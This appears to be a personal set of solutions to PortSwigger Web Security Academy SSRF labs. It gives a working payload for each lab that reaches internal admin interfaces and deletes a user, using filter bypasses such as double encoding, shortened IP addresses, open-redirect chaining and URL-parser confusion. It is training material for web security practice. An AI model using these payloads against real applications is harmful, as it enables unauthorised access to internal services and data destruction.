```
Lab: Basic SSRF against the local server

APPRENTICE

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos. 
```
```xml
stockApi=http://localhost/admin/delete?username=carlos
```
---
```
Lab: Basic SSRF against another back-end system

APPRENTICE

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, use the stock check functionality to scan the internal 192.168.0.X range for an admin interface on port 8080, then use it to delete the user carlos.
```

Use burp intruder :

```xml
stockApi=http%3A%2F%2F192.168.0.162%3A8080/admin/delete?username=carlos
```
---
```
Lab: SSRF with blacklist-based input filter

PRACTITIONER

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

The developer has deployed two weak anti-SSRF defenses that you will need to bypass. 
```

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#bypass-using-rare-address

Use burp intruder :

- Double encode de "a" of admin
- Short-hanf IP addresses by dropping a zero

Final payload :
```
http://127.0.1/%2561dmin/delete?username=carlos
```
---
```
Lab: SSRF with filter bypass via open redirection vulnerability

PRACTITIONER

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://192.168.0.12:8080/admin and delete the user carlos.

The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first. 
```
Payload :
```
stockApi=%2Fproduct%2FnextProduct%3FcurrentProductId%3D1%26path%3Dhttp://192.168.0.12:8080/admin/delete?username=carlos
```
---
```
Lab: SSRF with whitelist-based input filter

EXPERT

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

The developer has deployed an anti-SSRF defense you will need to bypass. 
```
interresting read :

https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf

Abusing URL Parser 

Payload :
```
stockApi=https://0a93000a0330d73580fbe49800f0009f.web-security-academy.net%2523@stock.weliketoshop.net/admin/delete?username=carlos
```
`Admin interface only available if logged in as an administrator, or if requested from loopback
So... use the loopback xD`

Payload :
```
stockApi=http://127.0.0.1:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```
---